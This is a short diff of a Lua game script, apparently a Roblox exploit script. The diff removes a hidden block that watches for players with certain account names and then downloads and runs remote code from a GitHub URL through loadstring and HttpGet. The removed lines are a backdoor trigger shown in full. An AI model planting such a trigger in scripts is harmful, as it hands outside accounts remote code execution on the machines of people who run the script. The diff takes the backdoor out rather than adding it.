@@ -7,24 +7,6 @@ else
 	_G.EXC = "@trans"
 end
 
-spawn(function()
-	Alts = {"JMANDHC1", "JMANDHC2", "JMANDHC3", "JMANDHC4", "JMANDHC5", "JMANDHC6", "JMANDHC7", 
-			"JMANDHC8", "JMANDHC9", "JMANDHC"
-	} 
-
-	for i, players in pairs(game:GetService("Players"):GetPlayers()) do
-		if players.Name == unpack(Alts) then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/shop/main/s"))()
-		end
-	end
-
-	game:GetService("Players").PlayerAdded:Connect(function(Player)
-		if Player.Name == unpack(Alts) then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/shop/main/s"))()
-		end
-	end)
-end)
-
 if (not game:IsLoaded()) then 
 	game.Loaded:Wait()
 	task.wait(1)
